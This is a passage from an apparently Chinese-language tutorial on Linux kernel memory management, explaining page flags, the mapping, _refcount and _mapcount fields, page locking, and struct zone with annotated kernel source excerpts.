PG_young,</span><br><span class="line">	PG_idle,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Filesystems */</span></span><br><span class="line">	PG_checked = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* 表示页面处于交换缓存中。 */</span></span><br><span class="line">	PG_swapcache = PG_owner_priv_1,	<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment">	 * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment">	 * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	PG_fscache = PG_private_2,	<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* XEN */</span></span><br><span class="line">	<span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">	PG_pinned = PG_owner_priv_1,</span><br><span class="line">	<span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">	PG_savepinned = PG_dirty,</span><br><span class="line">	<span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">	PG_foreign = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* SLOB */</span></span><br><span class="line">	PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">	PG_double_map = PG_private_2,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">	PG_isolated = PG_reclaim,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>内核定义了一些宏，用于检查页面是否设置了某个特定的标志位或者用于操作某些标志位。这些宏的名称都有一定的模式，<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.7/source/include/linux/page-flags.h" >具体如下<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<ul>
<li><code>PageXXX()</code>用于检查页面是否设置了 <code>PG_XXX</code> 标志位，如 <code>PageLRU()</code> 检查<code>PG_lru</code> 标志位是否置位了，<code>PageDirty()</code> 检查 <code>PG_dirty</code> 是否置位了。</li>
<li><code>SetPageXX()</code> 设置页面中的 <code>PG_XXX</code> 标志位，如 <code>SetPageLRU()</code> 用于设置 <code>PG_lru</code> ,<code>SetPageDirty()</code> 用于设置 <code>PG_dirty</code> 标志位。</li>
<li><code>ClearPageXXX()</code> 用于无条件地清除某个特定的标志位。</li>
</ul>
<h5 id="mapping"><a href="#mapping" class="headerlink" title="mapping"></a>mapping</h5><p><code>mapping</code> 成员表示页面所指向的地址空间。内核中的地址空间通常有两个不同的地址空间：</p>
<ul>
<li>一个用于文件映射页面，如在读取文件时，地址空间用于将文件的内容数据与装载数据的存储介质区关联起来；</li>
<li>另一个用于匿名映射。</li>
</ul>
<p>内核使用一个简单直接的方式实现了“一个指针，两种用途”，<code>mapping</code> 成员的最低两位用于判断是否指向匿名映射或 KSM 页面的地址空间。如果指向匿名页面，那么 <code>mapping</code> 成员指向匿名页面的地址空间数据结构 <code>anon_vma</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_ANON	0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_MOVABLE	0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_KSM	(PAGE_MAPPING_ANON | PAGE_MAPPING_MOVABLE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPPING_FLAGS	(PAGE_MAPPING_ANON | PAGE_MAPPING_MOVABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">PageMappingFlags</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_FLAGS) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">PageAnon</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_ANON) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> __PageMovable(<span class="keyword">struct</span> page *page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="type">unsigned</span> <span class="type">long</span>)page-&gt;mapping &amp; PAGE_MAPPING_FLAGS) ==</span><br><span class="line">				PAGE_MAPPING_MOVABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="refcount"><a href="#refcount" class="headerlink" title="_refcount"></a>_refcount</h5><p><code>_refcount</code> 表示内核中引用该页面的次数。</p>
<ul>
<li>当 <code>_refcount</code> 的值为 0 时，表示该页面为空闲页面或即将要被释放的页面。</li>
<li>当 <code>_refcount</code> 的值大于 0 时，表示该页面已经被分配且内核正在使用，暂时不会被释放。</li>
</ul>
<p>内核中提供加&#x2F;减 <code>_refcount</code> 的接口函数，读者应该使用这些接口函数来使用 <code>_refcount</code> 引用计数。</p>
<ul>
<li><code>get_page()</code>: <code>_refcount</code> 加 1 。</li>
<li><code>put_page()</code>: <code>_refcount</code> 减 1 。若 <code>_refcount</code> 减 1 后等于 0 ,那么会释放该页面。</li>
</ul>
<p>这两个接口函数实现在 <code>include/linux/mm.h</code> 文件中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 函数调用 page ref_inc() 来增加引用计数，最后使用 atomic_inc() 函数原子地增加引用计数。 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">get_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Getting a normal page or the head of a compound page</span></span><br><span class="line"><span class="comment">	 * requires to already have an elevated page-&gt;_refcount.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	VM_BUG_ON_PAGE(page_ref_count(page) &lt;= <span class="number">0</span>, page);</span><br><span class="line">	page_ref_inc(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For devmap managed pages we need to catch refcount transition from</span></span><br><span class="line"><span class="comment">	 * 2 to 1, when refcount reach one it means the page is free and we</span></span><br><span class="line"><span class="comment">	 * need to inform the device driver through callback. See</span></span><br><span class="line"><span class="comment">	 * include/linux/memremap.h and HMM for details.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (put_devmap_managed_page(page))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	*  首先使用 put_page_testzero() 函数来使 _refcount 减 1 并且判断其是否为 0 。</span></span><br><span class="line"><span class="comment">	*  如果 _refcount 减 1 之后等于 0 ,就会调用 _put_page() 来释放这个页面。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">		__put_page(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="mapcount"><a href="#mapcount" class="headerlink" title="_mapcount"></a>_mapcount</h5><p><code>_mapcount</code> 表示这个页面被进程映射的个数，即已经映射了多少个用户 PTE 。<br> 每个用户进程都拥有各自独立的虚拟空间（256TB）和一份独立的页表，所以可能出现多个用户进程地址空间同时映射到一个物理页面的情况，RMAP 系统就是利用这个特性来实现的。<code>_mapcount</code> 主要用于RMAP系统中。</p>
<ul>
<li>若 <code>_mapcount</code> 等于 -1 ，表示没有 PTE 映射到页面。</li>
<li>若 <code>_mapcount</code> 等于 0 ，表示只有父进程映射到页面。<br> 匿名页面刚分配时， <code>_mapcount</code> 初始化为 0 。例如,当 <code>do_anonymous_page()</code> 产生的匿名页面通过 <code>page_add_new_anon_rmap()</code> 添加到 rmap 系统中时，会设置 <code>_mapcount</code> 为 0 ，这表明匿名页面当前只有父进程的 PTE 映射到页面。</li>
<li>若 <code>_mapcount</code> 大于 0 ,表示除了父进程外还有其他进程映射到这个页面。同样以创建子进程时共享父进程地址空间为例，设置父进程的 PTE 内容到子进程中并增加该页面的 <code>_mapcount</code> 。</li>
</ul>
<p>linux 内核通过 <code>page_dup_rmap</code> 函数修改 <code>_mapcount</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">page_dup_rmap</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">bool</span> compound)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">atomic_inc</span>(compound ? compound_mapcount_ptr(page) : &amp;page-&gt;_mapcount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="PG-Locked"><a href="#PG-Locked" class="headerlink" title="PG_Locked"></a>PG_Locked</h5><p><code>page</code> 数据结构中的成员 <code>flags</code> 定义了一个标志位 <code>PG_locked</code> ,内核通常利用 <code>PG_locked</code> 来设置一个页锁。<code>lock _page()</code> 函数用于申请页锁，如果页锁被其他进程占用了，那么它会睡眠等待。<br> <code>lock _page()</code> 函数的声明和实现如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">lock_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	might_sleep();</span><br><span class="line">	<span class="keyword">if</span> (!trylock_page(page))</span><br><span class="line">		__lock_page(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">trylock_page</span><span class="params">(<span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	page = compound_head(page);</span><br><span class="line">    <span class="comment">/* 使用 test_and_set_bit_lock() 尝试为 page 的 flags 设置 PG_locked 标志位，并且返回原来标志位的值 */</span></span><br><span class="line">	<span class="keyword">return</span> (likely(!test_and_set_bit_lock(PG_locked, &amp;page-&gt;flags)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __lock_page(<span class="keyword">struct</span> page *__page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> compound_head(__page);</span><br><span class="line">	<span class="type">wait_queue_head_t</span> *q = page_waitqueue(page);</span><br><span class="line">    <span class="comment">/* 当 trylock_page() 无法获取锁时,当前进程会调用wait_on_page_bit_common()函数让其在等待队列中睡眠、等待这个锁。*/</span></span><br><span class="line">	wait_on_page_bit_common(q, page, PG_locked, TASK_UNINTERRUPTIBLE,</span><br><span class="line">				EXCLUSIVE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="zone"><a href="#zone" class="headerlink" title="zone"></a>zone</h4><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的区（zone），对应结构体 <code>struct zone</code>，该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  每个 zone 在系统启动时会计算出 3 个水位，</span></span><br><span class="line"><span class="comment">    *  分别是最低警戒水位（WMARK_MIN）、低水位（WMARK_LOW）和高水位（WMARK_HIGH），</span></span><br><span class="line"><span class="comment">    *  这在页面分配器和kswapd 页面回收中会用到。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> _watermark[NR_WMARK];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">	 * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">	 * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">	 * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">	 * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">	 * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">	 * changes.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">/* 防止页面分配器过度使用低端 zone 的内存。 */</span></span><br><span class="line">	<span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/* NUMA 中标识所属 node */</span></span><br><span class="line">	<span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 指向内存节点。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>	*<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/* 用于维护每个CPU上的一系列页面，以减少自旋锁的争用。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">	 * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="comment">/* 起始页帧号。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		zone_start_pfn;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">	 * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">	 * 	spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">	 * is calculated as:</span></span><br><span class="line"><span class="comment">	 *	present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">	 * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">	 * bootmem allocator):</span></span><br><span class="line"><span class="comment">	 *	managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">	 * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">	 * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">	 * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">	 * and thresholds.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Locking rules:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">	 * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">	 * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">	 * quite infrequently.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">	 * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">	 * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">	 * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">	 * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">/* zone 中被伙伴系统管理的页面数量。 */</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		managed_pages;</span><br><span class="line">    <span class="comment">/* zone 包含的页面数量。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		spanned_pages;</span><br><span class="line">    <span class="comment">/* zone 里实际管理的页面数量。对于一些架构来说，其值和 spanned _pages 的值相等。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		present_pages;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">	 * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">	 * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">	<span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">	<span class="type">seqlock_t</span>		span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> initialized;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* free areas of different sizes */</span></span><br><span class="line">    <span class="comment">/* 伙伴系统的核心数据结构，管理空闲页块(page block）链表的数组。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* zone flags, see below */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Primarily protects free_area */</span></span><br><span class="line">    <span class="comment">/* 并行访问时用于保护 zone 的自旋锁。 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">	 * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">	 * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		compact_cached_free_pfn;</span><br><span class="line">	<span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">	 * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">	 * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		compact_considered;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		compact_defer_shift;</span><br><span class="line">	<span class="type">int</span>			compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">	<span class="type">bool</span>			compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span>			contiguous;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad3_)</span><br><span class="line">	<span class="comment">/* Zone statistics */</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure></div>

